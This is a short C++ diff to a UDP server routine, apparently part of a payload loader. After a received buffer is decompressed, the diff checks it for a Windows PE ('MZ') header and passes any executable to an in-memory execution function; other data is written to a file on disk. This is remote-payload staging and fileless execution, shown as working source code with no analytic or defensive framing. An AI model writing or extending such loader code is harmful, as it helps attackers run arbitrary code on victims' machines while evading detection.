@@ -128,14 +128,20 @@ int udp_server_clinet(int Port, std::string password)
 
         //execute in memory ------------------------------------------------------------------------------------
         //ToDo only execute in memory on (1) flag and (2) if it really is a PE as detected here.
-        if (DecompressedBuffer[0] == 77) {
-            if (DecompressedBuffer[1] == 90) {
-                printf("Detected PE executable!\n");
-            }
+        if ((DecompressedBuffer[0] == 77) && (DecompressedBuffer[1] == 90)) 
+        {
+            printf("Detected PE executable!\n");
+            //in-memory execution
+            exe_dll_in_mem(DecompressedBuffer, decompressed_size); //ToDo
         }
-
-        //in-memory execution
-        exe_dll_in_mem(DecompressedBuffer, decompressed_size); //ToDo
+        else 
+        {
+            printf("File is not PE, saving to disk");
+            FILE* File;
+            fopen_s(&File,"opt", "wb");
+            fwrite(DecompressedBuffer, 1, decompressed_size, File);
+            fclose(File);
+        }
 
 		//we should have done this earlier
 		free(Buffer);
